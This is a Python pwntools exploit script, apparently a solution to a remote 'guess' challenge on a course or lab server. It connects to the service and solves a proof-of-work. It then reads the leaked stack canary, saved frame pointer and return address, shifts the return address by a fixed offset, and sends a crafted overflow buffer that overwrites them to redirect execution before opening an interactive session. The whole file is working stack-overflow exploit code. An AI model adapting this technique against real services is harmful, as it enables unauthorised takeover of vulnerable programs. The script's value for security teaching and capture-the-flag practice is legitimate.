#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

payload = None
if os.path.exists(exe):
    with open(exe, 'rb') as f:
        payload = f.read()

#r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {:x}".format(len(payload), ef.symbols['solver']))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(ef.symbols['solver']).encode())
    r.sendafter(b'bytes): ', payload)
else:
    r.sendlineafter(b'send to me? ', b'0')

other = r.recv()
print(other.decode())

other = r.recvuntil(b' = ')
print(other.decode())
canary = r.recvuntil(b'\n').decode()
canary = canary.replace('\n','')
print(canary)
canary = int(canary, 16)

other = r.recvuntil(b' = ')
print(other.decode())
rbp = r.recvuntil(b'\n').decode()
rbp = rbp.replace('\n','')
print(rbp)
rbp = int(rbp, 16)

other = r.recvuntil(b' = ')
print(other.decode())
ra = r.recvuntil(b'\n').decode()
ra = ra.replace('\n','')
print(ra)
ra = int(ra, 16)

# take solver'ra to guess'ra
ra = ra + (int('0xa3aa', 16) - int('0xa2ff', 16))

myguess = 1234
buf = b''.join([str(myguess).encode('ascii').ljust(16, b'\0'), p64(myguess), p64(canary), p64(rbp), p64(ra), p64(myguess), p32(myguess), p32(myguess)])
print("buf = ", buf)
#pause()
r.sendafter(b'your answer? ',buf)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
